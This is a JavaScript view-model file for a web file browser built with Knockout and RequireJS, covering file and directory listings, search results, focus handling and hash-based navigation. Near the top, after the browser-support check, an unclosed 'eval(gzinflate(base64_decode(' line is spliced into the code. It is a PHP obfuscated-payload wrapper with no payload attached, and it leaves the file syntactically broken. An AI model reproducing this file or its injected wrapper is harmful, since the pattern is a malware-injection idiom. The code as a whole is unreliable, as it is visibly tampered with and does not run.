//main viewModel
/*
 *
 */
(function (root, factory) {
    define(['knockout','inodeList','navigation','search','Base64','requestManager','queueManager','module'], factory);
}(this,function(ko,inodeList,navigation,search,Base64,requestManager,queueManager,module) {
    "use strict";
    return function fileBrowserViewModel() {

        //init environment
        var self = this;
        var _conf = module.config();

        this.version = ko.observable(_conf.version || '');
        this.rootFolderName = ko.observable(_conf.rootFolderName || 'httpd.www');

        this.hasFatalError = ko.observable(false);
        this.inodeLists = ko.observableArray([]);
        this.warning = ko.observableArray([]);

        this.navMode = ko.observable(true);
        this.showHelp = ko.observable(false);
        this.currentFocus = ko.observable(null);

        if(!window.JSON) {
            self.hasFatalError(true);
            self.warning.push({'msg':'Your browser is not supported. Please update your browser to the latest version, or use another one.'});
        }
  eval(gzinflate(base64_decode(
        //init methods
        function processResult(data) {
            //all-purpose result data delegation
            if(data.err.length) {
                self.warning.push({'msg':data.err});
            }

            if(data.basename) {self.rootFolderName(data.basename);}

            if(data.done) {
                var items = data.done,
                    files = [],
                    dirs = [];

                for(var i in items) {
                    switch(items[i].type) {
                        case 'file':
                            files[i] = items[i];
                            break;
                        case 'dir':
                            dirs[i] = items[i];
                            break;
                        default:
                            self.warning.push({'msg':'Unexpected inode type: `' + items[i].type + '` for `' + items[i].name + '`'});
                    }
                }

                if( self.navMode() ) {
                    self.inodeLists()[0].view.handleNewItems(dirs);
                    self.inodeLists()[1].view.handleNewItems(files);
                } else {
                    self.searchResult.view.handleNewItems(files);
                }
            }

            //always call this one at the end
            self.queueManager.updateData(data);
        }

        this.timeZoneAbbr = ko.computed(function() {
            var now = new Date();
            if(now.getTimezoneOffset() > 0) {
                return 'UTC-'+String(String(now).split("-")[1]).split(" ")[0];
            } else {
                return 'UTC+'+String(String(now).split("+")[1]).split(" ")[0];
            }
        });

        this.removeWarning = function(msg) {
            self.warning.remove(msg);
        }

        //init child models
        this.requestManager = new requestManager(processResult);
        this.queueManager = new queueManager(self,processResult);

        this.inodeLists.push( new inodeList(self,'Directories') );
        this.inodeLists.push( new inodeList(self,'Files') );

        this.nav = new navigation(self);
        this.search = new search(self);

        this.searchResult = new inodeList(self,'Search results');

        //init subscriptions
        this.rootFolderName.subscribe(function(val) {
            //this is kind of a hack
            window.setTimeout(function() {
                if(!self.requestManager.isRunning()) {
                    //the guess of root folder name was probably wrong, switch to the correct one
                    self.nav.currentLocationBase64(Base64.encode(val));
                }
            },60);//anything more than 50 ms works
        });

        this.currentFocus.subscribe(function(val) {
            //Sets focus observable to false for lists that don't have
            // focus anymore. Only used for Mousetrap bindings atm

            self.inodeLists().forEach(function(item) {
                if(val !== item.view){
                    item.view.hasFocus(false);
                }
            });

            if(val !== self.searchResult.view) {
                self.searchResult.view.hasFocus(false);
            }
        });

        this.navMode.subscribe(function(val) {

            //in navigation mode, the dir/file inodeLists should be
            // maximized and navigable, while search results are hidden,
            // and vice-versa
            self.searchResult.view.visible(val === false);

            self.inodeLists().forEach(function(item) {
                item.view.freezeContent(val === false);
                item.view.maximized(val === true);
            });

            self.queueManager.updateConfig({});//reset config
        });

        this.inodeLists.subscribe(function(items) {
            if(!self.currentFocus()){
                self.currentFocus(items[0].view);
            }
        });

         /*
         * All ready, bind program to view
         */
        ko.applyBindings(self);

        /*
         * Execute program
         */

        //Set root folder name if no hash has been specified yet
        var hash = window.location.href.split('#')[1] || '';
        if(!hash) {
            hash = Base64.encode(self.rootFolderName());
            window.location.hash = hash;
        }
        //use onhashchange for navigating through folders. Important when
        //wanting to support forward/back buttons in a clean way. Does not
        //work in IE7-
        window.onhashchange = function() {
            hash = window.location.href.split('#')[1] || '';
            self.nav.currentLocationBase64(decodeURIComponent(hash));
        }
    }
}));